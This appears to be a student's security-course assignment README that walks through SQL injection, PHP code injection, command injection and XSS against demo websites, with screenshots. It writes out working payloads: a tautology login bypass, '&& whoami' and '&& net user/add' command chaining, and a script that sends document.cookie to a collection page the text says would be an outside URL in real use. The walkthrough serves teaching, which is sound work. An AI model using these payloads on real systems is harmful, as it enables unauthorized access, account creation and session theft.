
# Implementation of 4 types of injection attacks

Implementation of 4 types of injection attacks SQL injection, code injection, command injection and XSS cross site scripting attack.


## 1. SQL injection :

**Goal ‐ A simple login authentication dynamic website.**


How to perform ‐


**step 1** ‐ with a true existing user with valid name and password.



![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-000.jpg?raw=true)

![APP Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-001.png?raw=true)

**Result** ‐

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-002.jpg?raw=true)


**step 2** ( performing ) ‐ 
```bash
  'OR'1'='1
```


![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-004.jpg?raw=true)
![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-005.jpg?raw=true)


_Note : schema for this specif code contains id, name, password_

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/Screenshot%20(500).png?raw=true)



## 2. Code injection :


**Goal ‐ A simple website for calculating result of an expression.**

How to perform ‐

**step 1** : 
```
1+1*2 
```
is input as a simple expression

![APP Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-006.jpg?raw=true)

**Result**
![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-007.jpg?raw=true)

**step 2** : 
```
1+1*2 && phpinfo();
```
![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-008.jpg?raw=true)

***Result**

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-009.jpg?raw=true)


# 3. Command injection :

**Goal ‐ A simple website which can tell us ping of any ip address or url.**

How to perform ‐

**step 1** ‐ check ping of any ip address or website


![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-010.jpg?raw=true)


**Result**

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-011.jpg?raw=true)

**step 2** ‐ 
```
8.8.8.8 && whoami
```
![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-012.jpg?raw=true)

**Result**

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-013.jpg?raw=true)


desktop‐u1vs0am\samir boro

similer commands to perform code injectio ‐


```
8.8.8.8 && whoami
```

```
8.8.8.8 && net user/add test
```
```
8.8.8.8 && net user/ net users // to check
```



# 4. XSS injection :

**Goal ‐ A greeting website which gerenartes hello, ______name**

How to perform ‐

**step 1** ‐ we are checking in input tag to perform xss
```
<script> alert("I'm root ") </script>
```

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-014.jpg?raw=true)

**Result**

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-015.jpg?raw=true)


**step 2** ‐ 
```
<script> location.href="xss.php?data='+document.cookie'" </script>
```

in real life that xss.php is replaced by www.something.com/xss.php or any urls.

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-016.jpg?raw=true)

**Result** ‐ That leads no change in website. Congratulations we have successfully inject js
code.

**step 3** ‐ 
whenever any user submit their name to get greeting they will get the result, as well
as the cookie has now passed to xss.php without knowing to the user.




![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-017.jpg?raw=true)


![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-018.jpg?raw=true)

![App Screenshot](https://github.com/Experiya/snapshot/blob/main/Attack_samirboro_IIITG/image-019.jpg?raw=true)











## Computer Security assignment

For support, email samirboro92@gmail.com 

Download the pdf - https://github.com/Experiya/snapshot/raw/main/Attack_samirboro_IIITG/Attack_samirboro_IIITG.pdf
